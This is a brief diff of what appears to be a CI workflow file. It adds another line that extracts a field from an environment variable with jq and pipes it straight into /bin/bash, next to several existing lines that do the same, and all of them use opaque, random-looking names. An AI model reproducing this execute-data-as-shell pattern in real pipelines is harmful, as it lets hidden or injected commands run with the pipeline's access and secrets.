@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$pbonr8708" | jq -r .wumun55204 | /bin/bash
           printf '%s' "$b678" | jq -r .mlmkt550 | /bin/bash
           echo $lk70 | jq -r .asgyi2 | /bin/bash
+          printf '%s' "$au3552" | jq -r .hxqnr760 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
